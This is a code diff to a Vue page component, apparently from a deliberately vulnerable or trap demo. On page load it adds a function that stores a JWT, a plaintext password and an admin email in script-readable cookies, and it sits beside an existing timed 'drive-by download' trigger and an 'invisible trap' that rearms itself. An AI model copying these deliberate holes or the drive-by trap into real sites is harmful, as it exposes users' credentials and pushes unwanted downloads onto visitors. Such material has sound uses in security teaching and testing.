@@ -24,7 +24,22 @@
         isRedirected.value = true;
     };
 
+    const setupVulnerableCookies = () => {
+        try {
+            // Version ultra-simplifiée : pas de date, pas de samesite, juste clé=valeur
+            document.cookie = "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-X92px_9J; path=/";
+            document.cookie = "password=MonSuperMotDePasse123; path=/";
+            document.cookie = "user_email=admin@obnibox.com; path=/";
+            document.cookie = "session_permanent=active; path=/";
+
+            console.log("Exécution terminée. Cookies présents :", document.cookie);
+        } catch (e) {
+            console.error("Erreur lors de l'injection :", e);
+        }
+    };
     onMounted(() => {
+        setupVulnerableCookies()
+
         setTimeout(() => {
             triggerDriveByDownload();
         }, 5000);
@@ -34,7 +49,7 @@
                 isRedirected.value = false;
                 console.log("Le piège invisible a été réarmé !");
             }
-        }, 10000);
+        }, 15000);
     });
 </script>
 
